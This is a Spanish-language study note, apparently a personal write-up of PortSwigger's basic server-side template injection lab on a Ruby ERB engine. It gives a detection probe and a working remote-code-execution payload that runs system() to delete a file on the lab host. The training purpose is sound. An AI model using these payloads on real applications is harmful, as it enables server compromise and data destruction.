---
aliases:
  - SSTI 001 - detección + RCE ERB (plaintext)
  - basic ssti erb ruby
tags:
  - vuln/ssti
  - example
  - portswigger
---

# 001 — Detección con `7*7` y RCE de manual (ERB, plaintext)

> Lab: [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) · **Apprentice** · técnica → [[vulnerabilities/009-server-side-template-injection/server-side-template-injection|entry point]]

## ¿Por qué acá? (el caso base)
- **Es el punto de partida:** tu input se renderiza **tal cual** (contexto *plaintext*), no hay que escapar ni cerrar nada → el SSTI más "de manual".
- **Por qué funciona:** un producto *out of stock* renderiza el parámetro `message` (GET) directamente como plantilla ERB → todo lo que metas se **evalúa como expresión Ruby**.

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (host del lab / comando).

Primero **detectás**: mandá la expresión aritmética y mirá si vuelve `49`.
<pre class="payload"><code>GET /?message=<mark>&lt;%= 7*7 %&gt;</mark> HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark></code></pre>
Si la respuesta muestra `49`, el motor evalúa Ruby → ERB. Ahora **RCE** con `system()`:
<pre class="payload"><code>GET /?message=<mark>&lt;%= system("rm /home/carlos/morale.txt") %&gt;</mark> HTTP/1.1
Host: <mark>LAB.web-security-academy.net</mark></code></pre>

## Verificación
La primera request devuelve `49` en el hueco del mensaje. La segunda ejecuta el comando y **`morale.txt` desaparece** → lab resuelto.

## Detalles que se pasan por alto
- El valor va **URL-encodeado** en el query string (`<`, `>`, espacios).
- ERB es el motor por defecto de Rails; `system()` es directo, no hace falta reflection.
- Confirmá **siempre** con `7*7` antes de tirar el payload de RCE: si no da `49`, no es ERB → cambiá de sintaxis (`{{7*7}}`, `${7*7}`).

→ Siguiente: [[vulnerabilities/009-server-side-template-injection/examples/002-rce-freemarker-usando-documentacion|002 · motor conocido (FreeMarker) → RCE leyendo la doc]]
